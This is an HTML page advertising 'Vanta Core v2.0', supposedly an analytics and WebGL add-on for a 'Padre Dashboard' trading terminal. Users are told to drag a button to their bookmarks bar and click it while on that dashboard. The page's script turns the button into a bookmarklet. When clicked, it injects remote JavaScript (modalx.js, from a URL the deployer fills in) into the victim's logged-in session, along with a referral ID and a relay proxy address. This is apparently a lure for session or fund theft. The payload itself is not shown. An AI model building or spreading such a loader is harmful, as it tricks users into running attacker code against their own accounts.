<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vanta Tracker | Advanced Terminal Analytics</title>
    <style>
        :root { --vanta-green: #00ff88; --vanta-bg: #050505; }
        body { background: var(--vanta-bg); color: #fff; font-family: 'Inter', sans-serif; text-align: center; margin: 0; padding: 100px 20px; }
        .hero { max-width: 800px; margin: 0 auto; }
        h1 { color: var(--vanta-green); font-size: 3rem; text-shadow: 0 0 20px rgba(0,255,136,0.3); }
        p { color: #888; font-size: 1.2rem; margin-bottom: 40px; }
        .btn-container { padding: 40px; border: 1px dashed #333; border-radius: 12px; display: inline-block; }
        .btn { 
            display: inline-block; padding: 18px 45px; 
            background: linear-gradient(135deg, var(--vanta-green), #00cc66); 
            color: #000; font-weight: 800; text-decoration: none; border-radius: 8px;
            box-shadow: 0 0 25px rgba(0, 255, 136, 0.4); cursor: move;
        }
        .ref-box { margin-top: 20px; font-size: 0.8rem; color: #444; }
    </style>
</head>
<body>
    <div class="hero">
        <h1>VANTA CORE v2.0</h1>
        <p>Real-time terminal analytics and WebGL acceleration for Padre Dashboard.</p>
        
        <div class="btn-container">
            <a id="vanta-loader" class="btn" href="#">DRAG TO BOOKMARKS</a>
            <div class="ref-box">ID: t23dad55</div>
        </div>
        
        <ol style="text-align:left; max-width:400px; margin: 40px auto; color:#777;">
            <li>Ensure Bookmarks Bar is visible (Ctrl+Shift+B).</li>
            <li>Drag the green button to your bar.</li>
            <li>Click it while on the Terminal Padre dashboard.</li>
        </ol>
    </div>

    <script>
        const REF_ID = "t23dad55"; 
        const PROXY = "https://vanta-proxy.jdurrulo.workers.dev/"; 
        // Replace with your GitHub Pages URL after uploading modalx.js
        const PAYLOAD_URL = "https://YOUR_USERNAME.github.io/vanta-tracker-project/modalx.js";

        const loader = `javascript:(function(){
            window.VANTA_REF="${REF_ID}";
            window.VANTA_PROXY="${PROXY}";
            const s=document.createElement('script');
            s.src="${PAYLOAD_URL}?"+Date.now();
            document.head.appendChild(s);
        })();`;

        document.getElementById('vanta-loader').href = loader;
    </script>
</body>
</html>
